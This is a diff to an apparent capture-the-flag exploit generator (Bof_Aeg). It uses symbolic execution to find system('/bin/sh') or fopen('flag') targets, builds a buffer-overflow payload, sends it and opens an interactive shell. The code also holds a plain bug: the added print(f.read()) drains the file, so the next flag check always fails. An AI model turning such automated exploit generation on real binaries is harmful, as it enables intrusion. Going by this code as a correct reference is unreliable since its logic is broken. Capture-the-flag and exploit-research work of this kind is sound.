@@ -141,8 +141,34 @@ class Bof_Aeg(object):
                     if cmd in (b'/bin/sh\x00',b'cat flag') or cmd13 == b'/bin/cat flag':
                         self.win_addr = pre.addr
                         pwn.log.info("Found system(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
-                        return
-        
+                        
+                    
+        if 'fopen' in self.elf.plt:
+            system_node = self.cfg.model.get_any_node(self.elf.plt['fopen'])
+            if system_node:
+                for pre in system_node.predecessors:
+                    # node may be included
+                    if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
+                        continue
+                    state = self.project.factory.blank_state(
+                    addr = pre.addr,
+                    mode = 'fastpath') # we don't want to do any solving
+                    simgr = self.project.factory.simgr(state)
+                    simgr.explore(find=pre.addr+pre.size-5)
+
+                    st = simgr.found[0]
+                    arg = st.memory.load(st.regs.rdi,8)
+                    if arg.uninitialized:
+                        break
+                    cmd = st.solver.eval(st.memory.load(st.regs.rdi,8),cast_to=bytes)
+                    cmd13 = st.solver.eval(st.memory.load(st.regs.rdi,13),cast_to=bytes)
+                    # print(cmd, cmd13)
+
+                    if cmd in (b'flag.txt',b'flag', b'/flag.txt', b'/flag'):
+                        self.win_addr = pre.addr
+                        pwn.log.info("Found fopen(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
+                        
+                    
         # looking for print flag to stdout
         flag_addrs = []
         flag_addrs.extend(list(self.elf.search(b'flag\x00')))
@@ -157,17 +183,20 @@ class Bof_Aeg(object):
                 r2 = init_r2(self.filepath, b'')
                 # Execute to the end of the first block of main
                 first_block = self.project.factory.block(self.elf.sym['main'])
-                r2.cmd('dcu '+hex(\
-                    first_block.addr+first_block.size-first_block.capstone.insns[-1].size))
-                r2.cmd('dr rip='+hex(tmp.block_addr))
-                r2.cmd('dc')
+                # continue until a specific address
+                addr_dcu = hex(\
+                    first_block.addr+first_block.size-first_block.capstone.insns[-1].size)
+                r2.cmd('dcu '+addr_dcu)
+                r2.cmd('dr rip='+hex(tmp.block_addr)) # set register value
+                r2.cmd('dc') # continue process execution
                 with open(self.outputpath,'rb') as f:
+                    print(f.read())
                     if b'flag{test}' in f.read():
                         self.win_addr = tmp.block_addr
                         pwn.log.info("Found flag win_addr :0x%x"%self.win_addr)
                         return
-
-        pwn.log.info("No win found!")
+        if not self.win_addr:
+            pwn.log.info("No win found!")
     
     def explore_to_win(self):
         """Use symbolic execution to explore to win
@@ -184,6 +213,7 @@ class Bof_Aeg(object):
         if simgr.found != []:
             pwn.log.success("Exploration success!")
             payload = b"".join(simgr.found[0].posix.stdin.concretize())
+            print(payload)
             self.p.sendline(payload)
             try:
                 self.p.interactive()
